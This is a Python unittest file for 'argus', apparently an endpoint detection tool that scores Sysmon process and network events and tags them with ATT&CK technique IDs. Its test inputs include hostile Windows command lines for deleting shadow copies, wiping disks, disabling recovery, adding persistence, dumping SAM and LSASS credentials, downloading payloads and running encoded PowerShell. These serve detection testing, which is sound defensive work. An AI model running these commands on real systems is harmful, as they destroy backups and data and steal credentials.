import unittest

from argus.events import ProcessEvent
from argus.score import dropped_script_path, is_remote_ip, score_event, score_network_event, shannon_entropy


def ev(image="", command_line="", parent_image="", integrity=""):
    return ProcessEvent(
        source="sysmon",
        event_id=1,
        timestamp="",
        pid=1,
        parent_pid=0,
        image=image,
        command_line=command_line,
        parent_image=parent_image,
        integrity=integrity,
    )


class TestScoring(unittest.TestCase):
    def test_temp_path_scores(self):
        s = score_event(ev(image=r"C:\Users\N\AppData\Local\Temp\evil.exe"))
        self.assertGreaterEqual(s.points, 35)
        self.assertTrue(any("path" in r for r in s.reasons))

    def test_roaming_path_scores(self):
        s = score_event(ev(image=r"C:\Users\N\AppData\Roaming\payload.exe"))
        self.assertGreaterEqual(s.points, 35)

    def test_benign_system_exe_scores_zero(self):
        s = score_event(ev(image=r"C:\Windows\System32\svchost.exe", command_line="svchost.exe -k netsvcs"))
        self.assertEqual(s.points, 0)
        self.assertEqual(s.reasons, [])

    def test_encoded_powershell_scores_high(self):
        s = score_event(ev(
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe -nop -w hidden -enc SQBFAFgA",
        ))
        self.assertGreaterEqual(s.points, 45)

    def test_office_spawning_shell(self):
        s = score_event(ev(
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        ))
        self.assertGreaterEqual(s.points, 35)
        self.assertTrue(any("Office" in r for r in s.reasons))

    def test_browser_spawning_shell(self):
        s = score_event(ev(
            image=r"C:\Windows\System32\cmd.exe",
            parent_image=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        ))
        self.assertGreaterEqual(s.points, 25)
        self.assertTrue(any("browser" in r for r in s.reasons))

    def test_low_integrity_scores(self):
        s = score_event(ev(image=r"C:\Windows\System32\notepad.exe", integrity="Low"))
        self.assertGreaterEqual(s.points, 15)

    def test_techniques_populated(self):
        s = score_event(ev(image=r"C:\Users\N\AppData\Local\Temp\evil.exe", command_line="evil.exe -enc X"))
        ids = [t["id"] for t in s.techniques_deduped()]
        self.assertIn("T1204.002", ids)      # temp path
        self.assertNotIn("T1059.001", ids)   # "-enc" is PowerShell-only; evil.exe is not a shell

    def test_carrier_process_does_not_inherit_shell_score(self):
        # A python wrapper whose ARGV merely CARRIES "powershell -enc ..." is not
        # powershell — it must not inherit the shell cmdline scores.
        s = score_event(ev(
            image=r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe",
            command_line=r'python.exe bridge.py --command "powershell.exe -NoP -Exec Bypass -enc SQBFAFgA"',
        ))
        self.assertEqual(s.points, 0)
        self.assertEqual(s.reasons, [])

    def test_shannon_entropy_orders_text(self):
        self.assertLess(shannon_entropy("powershell.exe -nop -w hidden"), 4.5)
        # a long, near-uniform base64-ish blob (the shape of a real obfuscated payload)
        cs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        blob = "".join(cs[(i * 7) % len(cs)] for i in range(300))
        self.assertGreater(shannon_entropy(blob), 5.0)

    def test_high_entropy_cmdline_scores(self):
        cs = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
        blob = "".join(cs[(i * 7) % len(cs)] for i in range(300))
        s = score_event(ev(
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            command_line="powershell.exe " + blob,
        ))
        self.assertTrue(any("high-entropy" in r for r in s.reasons))

    def test_script_host_runs_dropped_file_scores(self):
        # python.exe running a .py out of %TEMP% — the operator EXECUTING, not the
        # cradle arriving. The interpreter lives in a trusted path, so the image
        # check is blind to it.
        s = score_event(ev(
            image=r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe",
            command_line=r'python.exe "C:\Users\N\AppData\Local\Temp\argus_agent.py"',
        ))
        self.assertGreaterEqual(s.points, 40)
        self.assertTrue(any("dropped" in r for r in s.reasons))
        ids = [t["id"] for t in s.techniques_deduped()]
        self.assertIn("T1059.006", ids)

    def test_script_host_trusted_path_does_not_score(self):
        # python running a script in a NORMAL (non-dropper) location stays quiet.
        s = score_event(ev(
            image=r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe",
            command_line=r"python.exe C:\workspace\argus\run.py --once",
        ))
        self.assertEqual(s.points, 0)

    def test_dropped_script_path_extracts_temp_script(self):
        p = dropped_script_path(r'python.exe "C:\Users\N\AppData\Local\Temp\argus_agent.py"')
        self.assertTrue(p.endswith("argus_agent.py"))
        self.assertIn("temp", p.lower())

    def test_dropped_script_path_ignores_trusted_path(self):
        self.assertEqual(dropped_script_path(r'python.exe "C:\workspace\argus\run.py"'), "")

    def test_script_host_mentioning_programdata_does_not_score(self):
        # A python process whose ARGV mentions a data dir (e.g. C:\ProgramData\Argus)
        # but whose script is NOT in a dropper path must not be flagged as running a
        # dropped file. (Regression: the dropper path and the script must be the SAME path.)
        s = score_event(ev(
            image=r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe",
            command_line=r'python.exe bridge.py --command "$d=\"C:\ProgramData\Argus\""',
        ))
        self.assertEqual(s.points, 0)


class _Net:
    def __init__(self, image, ip, initiated=True, port=443):
        self.image = image
        self.destination_ip = ip
        self.destination_port = port
        self.initiated = initiated
        self.protocol = "tcp"

    def endpoint(self):
        return f"{self.destination_ip}:{self.destination_port}"


class _G:
    def __init__(self, novel=True):
        self.novel = novel

    def novel_endpoint(self, image, endpoint):
        return self.novel


class TestNetworkScoring(unittest.TestCase):
    def test_is_remote_ip(self):
        self.assertTrue(is_remote_ip("104.21.9.212"))
        self.assertFalse(is_remote_ip("192.168.1.5"))
        self.assertFalse(is_remote_ip("127.0.0.1"))
        self.assertFalse(is_remote_ip(""))

    def test_script_host_beacon_scores(self):
        s = score_network_event(
            _Net(r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe", "104.21.9.212"),
            _G(novel=True),
        )
        self.assertGreaterEqual(s.points, 40)
        ids = [t["id"] for t in s.techniques_deduped()]
        self.assertIn("T1071", ids)

    def test_browser_novel_connection_does_not_score(self):
        s = score_network_event(
            _Net(r"C:\Program Files\Google\Chrome\Application\chrome.exe", "104.21.9.212"),
            _G(novel=True),
        )
        self.assertEqual(s.points, 0)

    def test_private_destination_does_not_score(self):
        s = score_network_event(
            _Net(r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe", "192.168.1.5"),
            _G(novel=True),
        )
        self.assertEqual(s.points, 0)

    def test_already_seen_endpoint_does_not_score(self):
        s = score_network_event(
            _Net(r"C:\Users\N\AppData\Local\Programs\Python\Python312\python.exe", "104.21.9.212"),
            _G(novel=False),
        )
        self.assertEqual(s.points, 0)


class TestLolbinMisuse(unittest.TestCase):
    def _check(self, image, cmd, pts_min, technique, reason_frag):
        s = score_event(ev(image=image, command_line=cmd))
        self.assertGreaterEqual(s.points, pts_min, f"{image} :: {cmd}")
        ids = [t["id"] for t in s.techniques_deduped()]
        self.assertIn(technique, ids, f"{image} :: {cmd} -> {ids}")
        self.assertTrue(any(reason_frag in r for r in s.reasons), s.reasons)

    def test_vssadmin_shadow_delete(self):
        self._check(r"C:\Windows\System32\vssadmin.exe", "vssadmin delete shadows /all /quiet", 50, "T1490", "shadow")

    def test_wmic_shadowcopy_delete(self):
        self._check(r"C:\Windows\System32\wbem\WMIC.exe", "wmic shadowcopy delete", 50, "T1490", "shadow")

    def test_cipher_wipe(self):
        self._check(r"C:\Windows\System32\cipher.exe", "cipher /w:C:", 45, "T1485", "wipe")

    def test_bcdedit_recovery_disable(self):
        self._check(r"C:\Windows\System32\bcdedit.exe", "bcdedit /set {default} recoveryenabled No", 45, "T1490", "recovery")

    def test_schtasks_persistence(self):
        self._check(r"C:\Windows\System32\schtasks.exe", r"schtasks /create /sc onlogon /tn X /tr C:\x.exe", 45, "T1053.005", "persistence")

    def test_reg_sam_dump(self):
        self._check(r"C:\Windows\System32\reg.exe", r"reg save HKLM\SAM C:\temp\sam", 55, "T1003.002", "dump")

    def test_reg_runkey(self):
        self._check(r"C:\Windows\System32\reg.exe",
                    r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v X /d C:\x.exe /f",
                    45, "T1547.001", "persistence")

    def test_bitsadmin_download(self):
        self._check(r"C:\Windows\System32\bitsadmin.exe", "bitsadmin /transfer x /download http://e/x.exe C:\\x.exe", 40, "T1105", "download")

    def test_mshta_remote(self):
        self._check(r"C:\Windows\System32\mshta.exe", "mshta http://127.0.0.1/x.hta", 40, "T1218.005", "remote")

    def test_rundll32_comsvcs_lsass(self):
        self._check(r"C:\Windows\System32\rundll32.exe", r"rundll32 C:\Windows\System32\comsvcs.dll MiniDump 999 dump full", 55, "T1003.001", "LSASS")

    def test_procdump_lsass(self):
        self._check(r"C:\tools\procdump.exe", "procdump -ma lsass.exe C:\\temp\\lsass.dmp", 55, "T1003.001", "LSASS")

    def test_keylogger_hook(self):
        self._check(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    'powershell -Command "SetWindowsHookEx WH_KEYBOARD_LL"', 45, "T1056.004", "keylogger")

    def test_echo_simulation_does_not_inherit_vssadmin(self):
        # cmd.exe echoing "vssadmin delete shadows" must NOT get the ransomware
        # score — the rule is gated to vssadmin.exe itself.
        s = score_event(ev(image=r"C:\Windows\System32\cmd.exe",
                           command_line="cmd /c echo vssadmin delete shadows /all /quiet"))
        ids = [t["id"] for t in s.techniques_deduped()]
        self.assertNotIn("T1490", ids)


if __name__ == "__main__":
    unittest.main()
